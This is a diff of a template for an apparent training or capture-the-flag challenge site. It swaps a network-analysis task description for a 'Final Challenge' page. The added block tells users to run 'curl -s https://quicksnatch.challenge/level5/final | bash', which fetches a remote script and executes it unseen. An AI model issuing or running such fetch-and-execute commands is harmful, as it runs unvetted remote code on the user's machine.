@@ -1,24 +1,9 @@
 {% extends "challenges/level_base.html" %}
 
-{% block level_title %}Network Ninja Challenge{% endblock %}
+{% block level_title %}Final Challenge{% endblock %}
 
 {% block challenge_description %}
-<div class="challenge-description">
-    <h4>Network Traffic Analysis</h4>
-    <p>Your mission is to analyze network traffic and connections to discover a hidden flag. You'll need to use various networking tools.</p>
-    
-    <div class="task-list">
-        <h5>Your Tasks:</h5>
-        <ul>
-            <li>Use <code>netstat</code> to view network connections</li>
-            <li>Analyze network traffic patterns</li>
-            <li>Identify suspicious connections</li>
-            <li>Investigate network statistics</li>
-        </ul>
-    </div>
-
-    <div class="hint-box">
-        <p><strong>Hint:</strong> Pay attention to unusual ports or connections. The flag might be hidden in network traffic data.</p>
-    </div>
-</div>
+<p>Welcome to the final level! This challenge combines various skills from previous levels. Execute the command below to begin your final test.</p>
 {% endblock %}
+
+{% block curl_command %}curl -s https://quicksnatch.challenge/level5/final | bash{% endblock %}
